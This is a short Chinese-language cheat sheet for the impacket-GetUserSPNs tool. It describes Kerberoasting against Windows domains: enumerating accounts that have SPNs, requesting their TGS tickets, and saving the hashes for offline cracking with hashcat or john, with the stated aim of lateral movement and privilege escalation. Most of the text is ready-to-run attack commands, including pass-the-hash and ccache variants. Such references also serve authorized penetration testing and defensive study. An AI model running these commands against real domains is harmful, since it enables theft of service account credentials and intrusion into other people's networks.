# impacket-GetUserSPNs

## 介绍

impacket-GetUserSPNs是用来枚举域内“有SPN的账号”并发起Kerberoasting（请求TGS，导出可离线爆破的哈希票据）的工具。

## 它能干什么？

1.列出那些用户/服务账号配置了SPN

2.对这些SPN账号请求TGS

3.离线爆破（hashcat/john）拿到服务账号明文密码

4.进一步横向、提权

## 常用命令

### 1）只枚举（不请求票据）

impacket-GetUserSPNs 'DOMAIN/user:pass' -dc-ip <DC_IP>

### 2）Kerberoasting：枚举+请求TGS（最常用）

impacket-GetUserSPNs 'DOMAIN/user:pass' -dc-ip <DC_IP> -request

### 3）把hash输出到文件

impacket-GetUserSPNs 'DOMAIN/user:pass' -dc-ip <DC_IP> -request -outputfile tgs.hash

### 4）只针对某个用户名

impacket-GetUserSPNs 'DOMAIN/user:pass' -dc-ip <DC_IP> -request -target_user <svc_account>

### 5）用NTLM Hash（PTH）

impacket-GetUserSPNs 'DOMAIN/user' -hashes :<NTHASH> <DC_IP> -request -outputfile tgs.hash

### 6）用Kerberos票据（ccache）

export KRB5CCNAME=/tmp/xx.ccache

impacket-GetUserSPNs 'DOMAIN/user' -k -no-pass -dc-ip <DC_IP> -request -outputfile tgs.hash